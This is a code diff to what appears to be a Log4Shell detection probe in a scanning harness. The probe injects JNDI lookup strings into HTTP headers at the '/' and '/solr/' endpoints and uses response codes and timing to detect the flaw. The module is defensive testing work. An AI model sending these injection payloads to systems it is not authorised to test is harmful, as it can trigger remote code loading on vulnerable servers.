@@ -56,7 +56,11 @@ META = {
     "blocked_regex": r"timed out|Connection refused|HTTP_CODE:000|HTTP_CODE:403",
 }
 
-_PATH = "/solr/"  # Solr's real admin/API surface — '/' is just a redirect stub
+# Endpoints that reach the vulnerable logging call: '/' for generic Spring-style
+# apps (e.g. the lab's log4shell-vulnerable-app reads X-Api-Version there) and
+# '/solr/' for a real Apache Solr. Probe each; the first that serves (2xx/3xx) is
+# where the payload landed.
+_PATHS = ["/", "/solr/"]
 # doubled braces: this string also goes through ctx.run_cmd's .format(), same
 # as curl's own -w spec below — single braces here would make .format() treat
 # "jndi:ldap://..." as a (nonexistent) format field and raise KeyError('jndi').
@@ -83,17 +87,28 @@ def _extract_time(raw):
 
 def run(target, ctx):
     port = ctx.get_port("log4shell", 8080)
-    url = "http://%s:%d%s" % (target, port, _PATH)
+    out = ["# Log4Shell probe vs %s:%d" % (target, port), ""]
+
+    # find the endpoint that serves (payload reaches the app); signature probe each
+    url = None
+    sig_raw = ""
+    for path in _PATHS:
+        u = "http://%s:%d%s" % (target, port, path)
+        r = _probe(ctx, target, u, _JNDI_LOCAL, 10, _W_SIGNAL)
+        out += ["## signature probe (JNDI in UA + X-Api-Version) -> %s" % path, r, ""]
+        if re.search(r"HTTP_CODE:[23]\d\d", r):
+            url, sig_raw = u, r
+            break
+    if url is None:                       # none served 2xx/3xx -> use first path's result
+        url = "http://%s:%d%s" % (target, port, _PATHS[0])
+        sig_raw = sig_raw or _probe(ctx, target, url, _JNDI_LOCAL, 10, _W_SIGNAL)
 
     baseline_raw = _probe(ctx, target, url, "harness-baseline-probe", 8, _W_BASELINE)
-    sig_raw = _probe(ctx, target, url, _JNDI_LOCAL, 10, _W_SIGNAL)
     timing_raw = _probe(ctx, target, url, _JNDI_BLACKHOLE, 15, _W_SIGNAL)
 
-    out = [
-        "# Log4Shell probe vs %s" % url, "",
-        "## 1) baseline (no JNDI payload, timing reference only)", baseline_raw, "",
-        "## 2) signature probe (JNDI -> target's own loopback — always safe, no real server there)", sig_raw, "",
-        "## 3) timing probe (JNDI -> 192.0.2.1 unroutable — best-effort blind-detection, no listener needed)",
+    out += [
+        "## baseline (no JNDI payload, timing reference) on %s" % url, baseline_raw, "",
+        "## timing probe (JNDI -> 192.0.2.1 unroutable — blind-detection) on %s" % url,
         timing_raw,
     ]
 
